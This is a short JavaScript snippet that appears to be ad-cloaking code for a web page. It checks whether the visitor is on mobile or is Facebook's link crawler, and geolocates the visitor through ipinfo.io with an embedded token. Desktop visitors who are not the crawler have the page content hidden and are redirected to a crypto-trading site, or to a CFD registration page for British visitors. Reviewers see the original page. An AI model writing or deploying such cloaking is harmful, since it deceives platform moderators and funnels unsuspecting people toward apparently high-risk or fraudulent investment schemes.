function isMobileDevice() {
  return (typeof window.orientation !== "undefined") || (navigator.userAgent.indexOf('IEMobile') !== -1);
}

function redirectTo(url) {
  if (window.location.href !== url) {
    window.location.replace(url);
  }
}

if (!isMobileDevice()) {
  fetch('https://ipinfo.io/json?token=0784c654f65d07')
    .then(response => response.json())
    .then(data => {
      const isFacebookBot = navigator.userAgent.includes('facebookexternalhit');
      if (!isFacebookBot && data.country !== 'GB') {
        document.querySelector('.blue-page').style.display = 'none';
        redirectTo("https://www.cryptoacademie.net/");
      } else if (data.country === 'GB') {
        redirectTo("https://cfd.fortuna-invest.com/register");
      }
    });
}
